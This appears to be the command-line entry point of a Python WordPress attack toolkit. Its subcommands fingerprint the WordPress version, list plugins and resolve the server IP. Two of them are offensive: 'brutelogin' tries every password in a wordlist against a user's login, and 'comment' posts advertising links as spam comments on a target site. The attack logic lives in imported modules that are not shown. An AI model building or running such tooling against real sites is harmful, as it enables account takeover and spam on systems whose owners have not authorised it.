import Core.wplogin
import Core.wpversioncheck
import Core.wpcomment
import Core.wpfindplugins
import Core.wpgetip
import argparse


def brute_wp_login(username, wordlist, url):
    bl = Core.wplogin.BruteLogin(username, wordlist, url)
    with open(wordlist, 'r') as file:
        for line in file:
            stripped_line = line.strip('')
            bl.fill_form(stripped_line)
            if bl.submit_form(stripped_line):
                break


def check_version(url):
    vc = Core.wpversioncheck.GetVersion(url)

    if vc.locate_version():
        print(vc.locate_version())
    else:
        print(f"[!] Could not determine the version of Wordpress in use.")


def post_comment(target, advertise, anchor):
    wpc = Core.wpcomment.WPComment(target, advertise, anchor)
    wpc.post_comment()


def get_plugins(url):
    gp = Core.wpfindplugins.FindPlugins(url)
    list = gp.get_plugins()
    for line in list:
        print(line)


def get_ip_address(url):
    print(Core.wpgetip.get_ip(url))


def main():
    parser = argparse.ArgumentParser()
    subparser = parser.add_subparsers(dest='command')
    version = subparser.add_parser('version')
    comment = subparser.add_parser('comment')
    login = subparser.add_parser('brutelogin')
    plugins = subparser.add_parser('plugins')
    getip = subparser.add_parser(('getip'))

    getip.add_argument('--url', type=str, required=True)

    version.add_argument('--url', type=str, required=True)

    comment.add_argument('--target', type=str, required=True)
    comment.add_argument('--advertise', type=str, required=True)
    comment.add_argument('--anchor', type=str, required=True)

    login.add_argument('--username', type=str, required=True)
    login.add_argument('--wordlist', type=str, required=True)
    login.add_argument('--url', type=str, required=True)

    plugins.add_argument('--url', type=str, required=True)

    args = parser.parse_args()

    if args.command == 'version':
        check_version(args.url)

    if args.command == 'comment':
        post_comment(args.target, args.advertise, args.anchor)

    if args.command == 'brutelogin':
        brute_wp_login(args.username, args.wordlist, args.url)

    if args.command == 'plugins':
        get_plugins(args.url)

    if args.command == 'getip':
        get_ip_address(args.url)


if __name__ == "__main__":
    main()
